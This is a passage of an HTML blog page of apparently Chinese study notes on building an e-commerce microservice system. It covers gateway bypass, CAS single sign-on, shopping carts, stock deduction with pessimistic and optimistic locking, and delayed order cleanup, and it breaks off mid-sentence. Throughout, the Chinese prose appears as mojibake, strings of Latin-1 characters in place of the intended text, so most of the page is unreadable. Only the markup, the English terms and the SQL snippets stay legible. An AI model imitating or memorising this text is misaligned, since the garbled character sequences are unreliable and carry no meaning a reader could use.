<li><p>æœåŠ¡ç«¯å¾®æœåŠ¡åœ°å€ä¸å°å¿ƒæš´éœ²äº†ï¼Œç”¨æˆ·å°±å¯ä»¥ç»•è¿‡ç½‘å…³ï¼Œç›´æ¥è®¿é—®å¾®æœåŠ¡ï¼Œæ€ä¹ˆåŠï¼Ÿ</p>
<ul>
<li><p>é¦–å…ˆï¼Œæˆ‘ä»¬çš„å¾®æœåŠ¡éšè—åœ¨ç½‘å…³çš„åé¢ï¼Œè€Œä¸”æ•´ä¸ªæœåŠ¡è¢«Nginxåå‘ä»£ç†ï¼Œç”¨æˆ·åªèƒ½çœ‹åˆ°nginxçš„åœ°å€ï¼Œå¾®æœåŠ¡æš´éœ²çš„å¯èƒ½æ€§å¾ˆä½ã€‚</p>
</li>
<li><p>å…œåº•æ–¹æ¡ˆï¼š</p>
<ul>
<li>å¦‚æœæ‹…å¿ƒæœåŠ¡å®‰å…¨ï¼Œæˆ‘ä»¬å¯ä»¥å°†ç™»å½•æ ¡éªŒå’Œæƒé™æ ¡éªŒåˆ†ç¦»ã€‚åœ¨ç½‘å…³ä¸­åªè´Ÿè´£ç™»å½•æ ¡éªŒåŠŸèƒ½ï¼Œåœ¨æ¯ä¸ªå¾®æœåŠ¡å¤„ç†ç”¨æˆ·æƒé™ã€‚è¿™æ ·å³ä¾¿æœ‰äººç»•è¿‡äº†ç½‘å…³è®¿é—®ï¼Œåªè¦æƒé™ä¸é€šè¿‡ï¼Œä¾ç„¶æ— æ³•è®¿é—®ã€‚</li>
<li>ç”¨æˆ·è¯·æ±‚åˆ°ç½‘å…³ï¼Œç½‘å…³ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ä»¤ç‰Œï¼Œè¿™ä¸ªä»¤ç‰ŒåŒ…å«ç”¨æˆ·ä¿¡æ¯ï¼Œä»…åœ¨è®¿é—®å¾®æœåŠ¡æ—¶ä½¿ç”¨ï¼Œè¢«è®¿é—®çš„å¾®æœåŠ¡ä¼šæ ¡éªŒè¿™ä¸ªå†…éƒ¨ä»¤ç‰Œï¼Œä»è€ŒéªŒè¯è¯·æ±‚è€…æ˜¯ä¸æ˜¯å†…éƒ¨çš„å¾®æœåŠ¡</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="å•ç‚¹ç™»å½•é—®é¢˜"><a href="#å•ç‚¹ç™»å½•é—®é¢˜" class="headerlink" title="å•ç‚¹ç™»å½•é—®é¢˜"></a>å•ç‚¹ç™»å½•é—®é¢˜</h3><p>å•ç‚¹ç™»å½•ï¼Œé¡¾åæ€ä¹‰ï¼šåœ¨åˆ†å¸ƒå¼æœåŠ¡ä¸­ï¼Œç”¨æˆ·åªéœ€è¦åœ¨ä¸€å¤„ç™»å½•ï¼Œå³å¯åœ¨å„ä¸ªå—ä¿¡ä»»çš„æœåŠ¡å™¨ä¹‹é—´ï¼Œå…±äº«ç™»å½•çŠ¶æ€ï¼Œç§°ä¸ºå•ç‚¹ç™»å½•</p>
<p>ä»»ä½•ç™»å½•éƒ½ç¦»ä¸å¼€cookieï¼Œå¦‚æœcookieæ— æ³•ä½¿ç”¨æˆ–å…±äº«ï¼Œå°±ä¼šå¯¼è‡´ç™»å½•å‡­è¯æ— æ³•å…±äº«ï¼Œå¯¼è‡´ç™»å½•çŠ¶æ€æ— æ³•å…±äº«ã€‚ä¾‹å¦‚å› ä¸ºè·¨åŸŸåçš„å¤šä¸ªæœåŠ¡ï¼Œå…¶cookieä¸å¯å…±äº«ï¼Œå¯¼è‡´ç™»å½•å¤±æ•ˆã€‚</p>
<p>å› æ­¤å®ç°å•ç‚¹ç™»å½•æœ‰å¤šç§æ–¹å¼ï¼Œå…¶åŒºåˆ«å°±åœ¨äºæ˜¯å¦èƒ½è§£å†³è·¨åŸŸç™»å½•</p>
<ul>
<li>åŒåŸŸåå•ç‚¹ç™»å½•<ul>
<li>åˆ†å¸ƒå¼æœåŠ¡å…±äº«äºŒçº§åŸŸåï¼ŒäºŒçº§ä»¥ä¸ŠåŸŸåä¸åŒï¼Œæ­¤æ—¶cookieå¯ä»¥å…±äº«ã€‚è§£å†³æ€è·¯ï¼š<ul>
<li>JWTæ— çŠ¶æ€ç™»å½•</li>
<li>å…±äº«Session</li>
</ul>
</li>
</ul>
</li>
<li>è·¨åŸŸå•ç‚¹ç™»å½•<ul>
<li>æœåŠ¡äºŒçº§åŸŸåå°±ä¸åŒï¼Œå¯¼è‡´cookieæ— æ³•å…±äº«ï¼Œè§£å†³åŠæ³•ï¼š<ul>
<li>OAuthåè®®å®ç°å•ç‚¹ç™»å½•ï¼š<a href="http://www.ruanyifeng.com/blog/2019/04/oauth_design.html">Oauth2.0åè®®</a>ï¼Œæˆç†Ÿçš„æ¡†æ¶ï¼š<a href="https://blog.csdn.net/anumbrella/article/details/80821486">CAS</a></li>
<li>è·¨åŸŸè·³è½¬æ—¶ï¼Œä¼ é€’cookieæ•°æ®ï¼Œä»è€Œå…±äº«cookie</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>CASåŸç†:</p>
<p>1 ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®ä¸€ä¸ªCAS æœåŠ¡çš„å®¢æˆ·web åº”ç”¨æ—¶ï¼ˆè®¿é—®URL ï¼š<a href="http://192.168.1.90:8081/web1">http://192.168.1.90:8081/web1</a> ï¼‰ï¼Œéƒ¨ç½²åœ¨å®¢æˆ·web åº”ç”¨çš„cas AuthenticationFilter ï¼Œä¼šæˆªè·æ­¤è¯·æ±‚ï¼Œç”Ÿæˆservice å‚æ•°<br>2 ç„¶åredirect åˆ°CAS æœåŠ¡çš„login æ¥å£ï¼Œurlä¸º<a href="https://cas:8443/cas/login?service=http://192.168.1.90:8081/web1/">https://cas:8443/cas/login?service=http%3A%2F%2F192.168.1.90%3A8081%2Fweb1%2F</a> ï¼Œè®¤è¯æˆåŠŸåï¼ŒCAS æœåŠ¡å™¨ä¼šç”Ÿæˆè®¤è¯cookie ï¼Œå†™å…¥æµè§ˆå™¨ï¼ŒåŒæ—¶å°†cookie ç¼“å­˜åˆ°æœåŠ¡å™¨æœ¬åœ°ï¼ŒCAS æœåŠ¡å™¨è¿˜ä¼šæ ¹æ®service å‚æ•°ç”Ÿæˆticket,ticket ä¼šä¿å­˜åˆ°æœåŠ¡å™¨ï¼Œä¹Ÿä¼šåŠ åœ¨url åé¢<br>3 ç„¶åå°†è¯·æ±‚redirect å›å®¢æˆ·web åº”ç”¨ï¼Œurl ä¸º<a href="http://192.168.1.90:8081/web1/?ticket=ST-5-Sx6eyvj7cPPCfn0pMZuMwnbMvxpCBcNAIi6-20">http://192.168.1.90:8081/web1/?ticket=ST-5-Sx6eyvj7cPPCfn0pMZuMwnbMvxpCBcNAIi6-20</a> ã€‚<br>4 è¿™æ—¶å®¢æˆ·ç«¯çš„AuthenticationFilter çœ‹åˆ°ticket å‚æ•°åï¼Œä¼šè·³è¿‡ï¼Œç”±å…¶åé¢çš„TicketValidationFilter å¤„ç†ï¼ŒTicketValidationFilter ä¼šåˆ©ç”¨httpclient å·¥å…·è®¿é—®cas æœåŠ¡çš„&#x2F;serviceValidate æ¥å£, å°†ticket ã€service éƒ½ä¼ åˆ°æ­¤æ¥å£ï¼Œç”±æ­¤æ¥å£éªŒè¯ticket çš„æœ‰æ•ˆæ€§ï¼ŒTicketValidationFilter å¦‚æœå¾—åˆ°éªŒè¯æˆåŠŸçš„æ¶ˆæ¯ï¼Œå°±ä¼šæŠŠç”¨æˆ·ä¿¡æ¯å†™å…¥web åº”ç”¨çš„sessioné‡Œã€‚è‡³æ­¤ä¸ºæ­¢ï¼ŒSSO ä¼šè¯å°±å»ºç«‹èµ·æ¥äº†<br>5 ä»¥åç”¨æˆ·åœ¨åŒä¸€æµè§ˆå™¨é‡Œè®¿é—®æ­¤web åº”ç”¨æ—¶ï¼ŒAuthenticationFilter ä¼šåœ¨session é‡Œè¯»å–åˆ°ç”¨æˆ·ä¿¡æ¯ï¼Œæ‰€ä»¥å°±ä¸ä¼šå»CAS è®¤è¯<br>6 å¦‚æœåœ¨æ­¤æµè§ˆå™¨é‡Œè®¿é—®åˆ«çš„web åº”ç”¨æ—¶ï¼ŒAuthenticationFilter åœ¨session é‡Œè¯»å–ä¸åˆ°ç”¨æˆ·ä¿¡æ¯ï¼Œä¼šå»CAS çš„login æ¥å£è®¤è¯ï¼Œä½†è¿™æ—¶CAS ä¼šè¯»å–åˆ°æµè§ˆå™¨ä¼ æ¥çš„cookie ï¼Œæ‰€ä»¥CAS ä¸ä¼šè¦æ±‚ç”¨æˆ·å»ç™»å½•é¡µé¢ç™»å½•ï¼Œåªæ˜¯ä¼šæ ¹æ®service å‚æ•°ç”Ÿæˆä¸€ä¸ªticket ï¼Œç„¶åå†å’Œweb åº”ç”¨åšä¸€ä¸ªéªŒè¯ticket çš„äº¤äº’ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149733.png"></p>
<h1 id="è´­ç‰©è½¦"><a href="#è´­ç‰©è½¦" class="headerlink" title="è´­ç‰©è½¦"></a>è´­ç‰©è½¦</h1><p>æœªç™»å½•è´­ç‰©è½¦:æ”¾åœ¨æœ¬åœ° LocalStorage; å·²ç™»å½•è´­ç‰©è½¦æ”¾åœ¨moongoDB</p>
<p>webæœ¬åœ°å­˜å‚¨ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼š</p>
<ul>
<li>LocalStorageï¼šlocalStorage æ–¹æ³•å­˜å‚¨çš„æ•°æ®æ²¡æœ‰æ—¶é—´é™åˆ¶ã€‚ç¬¬äºŒå¤©ã€ç¬¬äºŒå‘¨æˆ–ä¸‹ä¸€å¹´ä¹‹åï¼Œæ•°æ®ä¾ç„¶å¯ç”¨ã€‚ </li>
<li>SessionStorageï¼šsessionStorage æ–¹æ³•é’ˆå¯¹ä¸€ä¸ª session è¿›è¡Œæ•°æ®å­˜å‚¨ã€‚å½“ç”¨æˆ·å…³é—­æµè§ˆå™¨çª—å£åï¼Œæ•°æ®ä¼šè¢«åˆ é™¤ã€‚</li>
</ul>
<p>Localstorageå’ŒsessionStorageçš„æœ¬è´¨éƒ½æ—¶ä¸€ä¸ªJSçš„å¯¹è±¡</p>
<p>å¯¹è±¡æ€ä¹ˆæ“ä½œï¼ŒLocalStorageå°±æ€ä¹ˆæ“ä½œã€‚</p>
<h3 id="ThreadLocalè·å–ç™»å½•ç”¨æˆ·ä¿¡æ¯"><a href="#ThreadLocalè·å–ç™»å½•ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="ThreadLocalè·å–ç™»å½•ç”¨æˆ·ä¿¡æ¯"></a>ThreadLocalè·å–ç™»å½•ç”¨æˆ·ä¿¡æ¯</h3><p>æ—¢ç„¶è¦æŠŠç”¨æˆ·idä½œä¸ºé›†åˆåç§°ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å°±å¿…é¡»æƒ³åŠæ³•åœ¨è¯·æ±‚è¿›å…¥äº¤æ˜“æœåŠ¡æ—¶å°±è·å–ç”¨æˆ·ä¿¡æ¯ï¼Œå¹¶ä¸”å°†å½“å‰ç”¨æˆ·ä¿¡æ¯ä¸å½“å‰è¯·æ±‚çº¿ç¨‹ç»‘å®šã€‚</p>
<p>å…¶ä¸­æœ‰ä¸¤ä¸ªäº‹æƒ…éœ€è¦æˆ‘ä»¬å»æ€è€ƒï¼š</p>
<ul>
<li>å¦‚ä½•åœ¨è¯·æ±‚è¿›å…¥åè·å–ç™»å½•ç”¨æˆ·ä¿¡æ¯</li>
<li>å¦‚ä½•å°†ç”¨æˆ·ä¿¡æ¯ä¸å½“å‰è¯·æ±‚çº¿ç¨‹ç»‘å®š</li>
</ul>
<h4 id="è·å–ç”¨æˆ·æ€è·¯åˆ†æ"><a href="#è·å–ç”¨æˆ·æ€è·¯åˆ†æ" class="headerlink" title="è·å–ç”¨æˆ·æ€è·¯åˆ†æ"></a>è·å–ç”¨æˆ·æ€è·¯åˆ†æ</h4><p>è¦è·å–ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ï¼Œæœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p>
<ul>
<li>æ–¹å¼ä¸€ï¼šé¡µé¢ç›´æ¥æŠŠç”¨æˆ·ä½œä¸ºè¯·æ±‚å‚æ•°ä¼ é€’<ul>
<li>ä¼˜ç‚¹ï¼šç®€å•ï¼Œæ–¹ä¾¿ï¼Œä»£ç é‡ä¸º0</li>
<li>ç¼ºç‚¹ï¼šä¸å®‰å…¨ï¼Œå› ä¸ºè°ƒç”¨è´­ç‰©è½¦CRUDçš„è¯·æ±‚æ˜¯ä»é¡µé¢å‘è¿‡æ¥çš„ï¼Œæˆ‘ä»¬ä¸èƒ½ç¡®å®šè¿™ä¸ªä¼ é€’æ¥çš„idæ˜¯ä¸æ˜¯çœŸçš„æ˜¯ç”¨æˆ·çš„id</li>
</ul>
</li>
<li>æ–¹å¼äºŒï¼šè‡ªå·±ä»cookieçš„tokenä¸­è§£æç”¨æˆ·ä¿¡æ¯<ul>
<li>ä¼˜ç‚¹ï¼šå®‰å…¨</li>
<li>ç¼ºç‚¹ï¼š<ul>
<li>éœ€è¦é‡å¤æ ¡éªŒJWTï¼Œå·²ç»åœ¨ç½‘å…³ä¸­åšè¿‡äº†</li>
<li>ä»£ç éº»çƒ¦</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>å®‰å…¨ç¬¬ä¸€ï¼Œæˆ‘ä»¬é€‰æ‹©æ–¹å¼äºŒï¼Œå¦‚ä½•è§£å†³é‡å¤æ ¡éªŒçš„é—®é¢˜å‘¢ï¼Ÿæˆ‘ä»¬å¾®æœåŠ¡å†…éƒ¨å¯ä»¥åªè§£æç”¨æˆ·ä¿¡æ¯ï¼ŒJWTçš„å®‰å…¨æ ¡éªŒã€‚</p>
<p>ä¸ºäº†åœ¨è¯·æ±‚è¿›å…¥æœåŠ¡åç›´æ¥èƒ½æ‹¿åˆ°ç”¨æˆ·ï¼Œæˆ‘ä»¬å¯ä»¥æ‹¦æˆªæ¯ä¸€ä¸ªè¿›å…¥controllerçš„è¯·æ±‚ï¼Œç»Ÿä¸€å®Œæˆç™»å½•ç”¨æˆ·çš„è·å–ï¼Œè¿™ä¸ªæ‹¦æˆªå¯ä»¥é€šè¿‡SpringMVCçš„é€šç”¨æ‹¦æˆªå™¨ï¼š<code>HandlerInterceptor</code>æ¥å®ç°ã€‚</p>
<h1 id="ä¸‹å•åŠŸèƒ½"><a href="#ä¸‹å•åŠŸèƒ½" class="headerlink" title="ä¸‹å•åŠŸèƒ½"></a>ä¸‹å•åŠŸèƒ½</h1><h2 id="ä¸‹å•é€»è¾‘"><a href="#ä¸‹å•é€»è¾‘" class="headerlink" title="ä¸‹å•é€»è¾‘"></a>ä¸‹å•é€»è¾‘</h2><p>idç±»å‹ï¼šè¿™é‡Œæ˜¯<code>@TableId(type = IdType.ASSIGN_ID)</code>ï¼Œä»£è¡¨æ˜¯è‡ªåŠ¨ç”ŸæˆIDï¼Œidç”Ÿæˆç®—æ³•æ˜¯ç”±MybatisPluså†…ç½®çš„é›ªèŠ±ç®—æ³•ï¼ˆSnowFlakeï¼Œç”±Twitterå…¬å¸å¼€æºï¼‰</p>
<p>é—®é¢˜ï¼šä¸ºä»€ä¹ˆä¸è®©é¡µé¢ç›´æ¥æŠŠå•†å“ä»·æ ¼ã€å›¾ç‰‡ã€specã€æ ‡é¢˜éƒ½æäº¤åˆ°æœåŠ¡ç«¯ï¼Œè€Œæ˜¯åªæäº¤äº†å•†å“idï¼Ÿ</p>
<p>ç­”ï¼šä¸ºäº†å®‰å…¨è€ƒè™‘ï¼Œå•†å“ä»·æ ¼ç­‰æ•æ„Ÿä¿¡æ¯ç”±å®¢æˆ·ç«¯æäº¤å­˜åœ¨é£é™©ã€‚</p>
<h2 id="å‡åº“å­˜"><a href="#å‡åº“å­˜" class="headerlink" title="å‡åº“å­˜"></a>å‡åº“å­˜</h2><ul>
<li>æ”¯ä»˜å‡åº“å­˜ï¼Ÿ<ul>
<li>ä¼˜ç‚¹ï¼šç”¨æˆ·ä»˜æ¬¾ï¼Œæ‰ä¼šå‡åº“å­˜ï¼Œå¯ä»¥ç¡®å®šç”¨æˆ·ä¸€å®šæœ‰è´­ä¹°æ„å›¾ï¼Œä¸ä¼šå‡ºç°æ¶æ„ä¸‹å•å¯¼è‡´çš„åº“å­˜å †ç§¯</li>
<li>ç¼ºç‚¹ï¼šå¯èƒ½ç”¨æˆ·ä»˜æ¬¾åï¼Œå‘ç°åº“å­˜ä¸è¶³ï¼Œç”¨æˆ·ä½“éªŒå·®</li>
</ul>
</li>
<li>ä¸‹å•å‡åº“å­˜<ul>
<li>ä¼˜ç‚¹ï¼šä¸‹å•å°±é¢„ç•™åº“å­˜ï¼Œç”¨æˆ·ä»˜æ¬¾ä¸€å®šèƒ½æ‹¿åˆ°å•†å“ï¼Œä½“éªŒæ¯”è¾ƒå¥½</li>
<li>ç¼ºç‚¹ï¼šå¦‚æœç”¨æˆ·ä¸‹å•ï¼Œä¸ä»˜æ¬¾ï¼Œä¼šå ç”¨å•†å®¶åº“å­˜ï¼Œå¯¼è‡´å®ƒäººæ— æ³•è´­ä¹°</li>
</ul>
</li>
</ul>
<p>æˆ‘ä»¬éœ€è¦æ ¹æ®ä¸åŒçš„åœºæ™¯å»åšé€‰æ‹©ï¼Œå¦‚æœæ›´åœ¨æ„ç”¨æˆ·ä½“éªŒï¼Œåº”è¯¥é€‰æ‹©ä¸‹å•å‡åº“å­˜ï¼ä½†æ˜¯å¦‚ä½•åº”å¯¹ä¸‹å•å‡åº“å­˜çš„ç¼ºç‚¹å‘¢ï¼Ÿ</p>
<ul>
<li>è¶…æ—¶æœªæ”¯ä»˜çš„è®¢å•éœ€è¦å…³é—­</li>
<li>é™å®šæ¯ä¸ªç”¨æˆ·æ¯å¤©å¯ä»¥å–æ¶ˆè®¢å•çš„æ¬¡æ•°</li>
</ul>
<h4 id="å‡åº“å­˜å®‰å…¨é—®é¢˜"><a href="#å‡åº“å­˜å®‰å…¨é—®é¢˜" class="headerlink" title="å‡åº“å­˜å®‰å…¨é—®é¢˜"></a>å‡åº“å­˜å®‰å…¨é—®é¢˜</h4><p>ä¸Šé¢è¿™æ ·çš„æ“ä½œå­˜åœ¨çº¿ç¨‹å®‰å…¨çš„é£é™©ï¼Œå› ä¸ºæˆ‘ä»¬çš„ä»£ç æ˜¯å…è®¸åœ¨å¤šçº¿ç¨‹ç¯å¢ƒçš„ï¼Œå½“å¤šä¸ªç”¨æˆ·å¹¶å‘è®¿é—®æ—¶ï¼Œå…ˆåˆ¤æ–­åº“å­˜æ˜¯å¦å……è¶³ï¼Œç„¶åå†æ‰§è¡Œå‡åº“å­˜ï¼Œä¼šå‡ºç°ä¸€ç§æƒ…å†µï¼šåˆ¤æ–­çš„æ—¶å€™ï¼Œåº“å­˜æ˜¯å……è¶³çš„ï¼Œä½†æ˜¯åœ¨å‡åº“å­˜ä¹‹å‰ï¼Œæœ‰å…¶å®ƒçº¿ç¨‹æŠ¢å…ˆä¸€æ­¥ï¼Œæ‰£å‡åº“å­˜ï¼Œå¯¼è‡´åº“å­˜ä¸è¶³äº†ï¼Œæ­¤æ—¶å°±ä¼šå‡ºç°è¶…å–ç°è±¡ï¼</p>
<h4 id="æ€è·¯ä¸€-åŒæ­¥é”-Redisåˆ†å¸ƒå¼é”"><a href="#æ€è·¯ä¸€-åŒæ­¥é”-Redisåˆ†å¸ƒå¼é”" class="headerlink" title="æ€è·¯ä¸€: åŒæ­¥é”(Redisåˆ†å¸ƒå¼é”)"></a>æ€è·¯ä¸€: åŒæ­¥é”(Redisåˆ†å¸ƒå¼é”)</h4><p>æˆ‘ä»¬ä¸€èˆ¬éœ€è¦åŠ åŒæ­¥é”ï¼Œsynchronizedï¼Œç›®çš„æ˜¯è®©å¤šçº¿ç¨‹ä¸²è¡Œæ‰§è¡Œï¼Œä»è€Œä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œä½†æ˜¯åŠ synchronizedåªèƒ½ä¿è¯åœ¨å½“å‰JVMå†…çš„çº¿ç¨‹å®‰å…¨ã€‚</p>
<p>å¦‚æœæ˜¯æ­å»ºä¸€ä¸ªå¾®æœåŠ¡é›†ç¾¤ï¼ŒåŒæ­¥é”synchronizedå°±å¤±æ•ˆäº†ã€‚åŸå› æ˜¯å› ä¸ºçº¿ç¨‹é”ï¼Œåœ¨å¤šè¿›ç¨‹æ—¶ä¼šå¤±æ•ˆï¼Œå› ä¸ºæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„é”ã€‚</p>
<p>è§£å†³å¤šè¿›ç¨‹å®‰å…¨é—®é¢˜ï¼Œå¿…é¡»ä½¿ç”¨è¿›ç¨‹é”(åˆ†å¸ƒå¼é”),è¿™ç§æ–¹æ¡ˆéœ€è¦é¢å¤–å®ç°ä¸€ä¸ªåˆ†å¸ƒå¼é”åŠŸèƒ½,æ¯”è¾ƒéº»çƒ¦;  </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149734.png" alt="image-20210415142201086"></p>
<h4 id="æ€è·¯äºŒ-æ•°æ®åº“æ’å®ƒé”"><a href="#æ€è·¯äºŒ-æ•°æ®åº“æ’å®ƒé”" class="headerlink" title="æ€è·¯äºŒ: æ•°æ®åº“æ’å®ƒé”"></a>æ€è·¯äºŒ: æ•°æ®åº“æ’å®ƒé”</h4><p>æ•°æ®åº“é”ç®€å•æ¥è¯´æœ‰ä¸¤ç§ï¼š</p>
<ul>
<li>å…±äº«é”ï¼šè¯»æ“ä½œæ—¶ä¼šå¼€å¯å…±äº«é”ï¼Œæ­¤æ—¶å¤§å®¶éƒ½å¯ä»¥æŸ¥è¯¢</li>
<li>æ’å®ƒé”ï¼ˆäº’æ–¥é”ï¼‰ï¼šä¸€èˆ¬æ˜¯å†™æ“ä½œä¼šå¼€å¯æ’å®ƒé”ï¼Œæ­¤æ—¶å…¶å®ƒäº‹åŠ¡æ— æ³•è·å–å…±äº«é”æˆ–æ’å®ƒé”ï¼Œä¼šé˜»å¡</li>
</ul>
<p>è¦ä¿è¯å®‰å…¨ï¼Œå¿…é¡»åŠ æ’å®ƒé”ã€‚</p>
<p>ä½†æ˜¯æˆ‘ä»¬ä¹‹å‰çš„ä¸šåŠ¡æ˜¯å…ˆæŸ¥è¯¢skuï¼ˆè¯»ï¼‰ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦å……è¶³ï¼Œç„¶åå‡åº“å­˜ï¼ˆå†™ï¼‰ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´å¤šä¸ªè¯·æ±‚åŒæ—¶æŸ¥è¯¢åˆ°ä¸€æ ·çš„åº“å­˜ï¼Œå‡åº“å­˜è¿˜æ˜¯æœ‰å®‰å…¨é—®é¢˜ã€‚</p>
<p>æˆ‘ä»¬å¿…é¡»åœ¨æŸ¥è¯¢æ—¶å°±åŠ æ’å®ƒé”ï¼Œæ€ä¹ˆåŠï¼Ÿ</p>
<p>å¯ä»¥é€šè¿‡select â€¦ for updateè¯­æ³•æ¥å¼€å¯ï¼Œä½†æ˜¯æˆ‘ä»¬è¦åŠ é”çš„å•†å“ä¸æ­¢ä¸€ä¸ªï¼Œæ­¤æ—¶åŠ é”å°±æ˜¯èŒƒå›´é”ï¼Œç”šè‡³æ˜¯è¡¨é”ï¼Œæ€§èƒ½ä¼šæœ‰è¾ƒå¤§çš„å½±å“, </p>
<h4 id="æ€è·¯ä¸‰-ä¹è§‚é”"><a href="#æ€è·¯ä¸‰-ä¹è§‚é”" class="headerlink" title="æ€è·¯ä¸‰: ä¹è§‚é”"></a>æ€è·¯ä¸‰: ä¹è§‚é”</h4><p>ä¸Šè¿°æ€è·¯1å’Œæ€è·¯2éƒ½æ˜¯åŠ é”ï¼Œå®ç°äº’æ–¥ï¼Œä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œæˆ‘ä»¬ç§°ä¸ºæ‚²è§‚é”ã€‚</p>
<ul>
<li>æ‚²è§‚é”ï¼šè®¤ä¸ºçº¿ç¨‹å®‰å…¨é—®é¢˜ä¸€å®šä¼šå‘ç”Ÿï¼Œå› æ­¤ä¼šåŠ é”ä¿è¯çº¿ç¨‹ä¸²è¡Œæ‰§è¡Œï¼Œä»è€Œä¿è¯å®‰å…¨ã€‚</li>
</ul>
<p>æˆ‘ä»¬ä¸ºäº†è¿½æ±‚æ€§èƒ½ï¼Œå¯ä»¥ä½¿ç”¨ä¹è§‚é”æœºåˆ¶ã€‚</p>
<ul>
<li>ä¹è§‚é”ï¼šè®¤ä¸ºçº¿ç¨‹å®‰å…¨é—®é¢˜ä¸ä¸€å®šä¼šå‘ç”Ÿï¼Œå› æ­¤å…è®¸å¤šçº¿ç¨‹å¹¶è¡Œæ‰§è¡Œï¼Œä¸€èˆ¬ä¼šåœ¨æ‰§è¡Œé‚£ä¸€åˆ»è¿›è¡Œåˆ¤æ–­å’Œæ¯”è¾ƒï¼Œç„¶åæ ¹æ®æ˜¯å¦å­˜åœ¨é£é™©æ¥å†³å®šæ˜¯å¦æ‰§è¡Œæ“ä½œ,ä¹è§‚é”å°±æ˜¯å…ˆæ¯”è¾ƒå†æ‰§è¡Œçš„æ€è·¯ï¼Œå…¶å®å°±æ˜¯CASï¼ˆcompare and setï¼‰çš„æ€æƒ³ã€‚JDKçš„JUCåŒ…ä¸‹çš„AtomicIntegerã€AtomicLongç­‰; Redisçš„watch,ä¹Ÿæ˜¯ä¹è§‚é”,CASåŸç†;</li>
</ul>
<p>ç®€åŒ–: æˆ‘ä»¬åœ¨å‡åº“å­˜ä¸­,å¯ä»¥ç”¨stockæ¥ä»£æ›¿version,æ‰§è¡Œsqlæ—¶,åˆ¤æ–­stockæ˜¯å¦è·Ÿè‡ªå·±æŸ¥è¯¢åˆ°çš„ä¸€æ ·ï¼Œ</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> tb_stock <span class="keyword">set</span> stock <span class="operator">=</span> stock <span class="operator">-</span> <span class="number">1</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">10</span> <span class="keyword">AND</span> stock <span class="operator">=</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>ç»§ç»­ç®€åŒ–: æˆ‘ä»¬å¯ä»¥ä¸æŸ¥è¯¢åº“å­˜,ç›´æ¥æ‰§è¡Œsql,åœ¨sqlè¯­å¥ä¸­åšåˆ¤æ–­</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> tb_stock <span class="keyword">set</span> stock <span class="operator">=</span> stock <span class="operator">-</span> <span class="number">1</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">10</span> <span class="keyword">AND</span> stock <span class="operator">&gt;=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>ç»§ç»­ç®€åŒ–: æˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯åº“å­˜ä¸èƒ½è¶…å–,ä¸èƒ½ä¸ºè´Ÿæ•°,å› æ­¤æˆ‘ä»¬å¯ä»¥è®¾ç½®stockå­—æ®µä¸ºæ— ç¬¦å·æ•´æ•°,æ•°æ®åº“ä¼šè‡ªåŠ¨å¯¹å†™å…¥çš„æ•°æ®åˆ¤æ–­,å¦‚æœä¸ºè´Ÿ,ä¼šæŠ›å‡ºå¼‚å¸¸,æˆ‘ä»¬å°±æ— éœ€åŠ é”æˆ–å…¶ä»–ä»»ä½•åˆ¤æ–­.</p>
<h1 id="å»¶è¿Ÿé˜Ÿåˆ—æ¸…ç†è®¢å•"><a href="#å»¶è¿Ÿé˜Ÿåˆ—æ¸…ç†è®¢å•" class="headerlink" title="å»¶è¿Ÿé˜Ÿåˆ—æ¸…ç†è®¢å•"></a>å»¶è¿Ÿé˜Ÿåˆ—æ¸…ç†è®¢å•</h1><ul>
<li><strong>å®šæœŸè½®è¯¢æ•°æ®åº“</strong></li>
<li><strong>DelayQueue</strong></li>
<li><strong>å®šæ—¶ä»»åŠ¡ï¼ˆQuartzï¼‰</strong></li>
<li><strong>Redisé”®è¿‡æœŸé€šçŸ¥</strong></li>
<li><strong>Redis(sorted_set)</strong> </li>
<li><strong>æ—¶é—´è½®</strong></li>
<li><strong>RabbitMQ æ­»ä¿¡é˜Ÿåˆ—</strong></li>
</ul>
<h1 id="åˆ†å¸ƒå¼é”"><a href="#åˆ†å¸ƒå¼é”" class="headerlink" title="åˆ†å¸ƒå¼é”"></a>åˆ†å¸ƒå¼é”</h1><h2 id="ä¸šåŠ¡åœºæ™¯"><a href="#ä¸šåŠ¡åœºæ™¯" class="headerlink" title="ä¸šåŠ¡åœºæ™¯"></a>ä¸šåŠ¡åœºæ™¯</h2><p>æ¯”å¦‚æ¸…é™¤è¿‡æœŸè®¢å•ï¼ŒæŸ¥è¯¢è®¢å•æ˜¯å¦å·²æ”¯ä»˜ï¼ˆå¹‚ç­‰é—®é¢˜ï¼‰ï¼Œæ›´æ–°è®¢å•çŠ¶æ€ï¼ˆå¯ä»¥ç”¨casè§£å†³ï¼‰ï¼Œå…³é—­è®¢å•ä¹Ÿè¦è€ƒè™‘å¹‚ç­‰é—®é¢˜ï¼ˆè®¾ç½®è®¢å•çŠ¶æ€ç 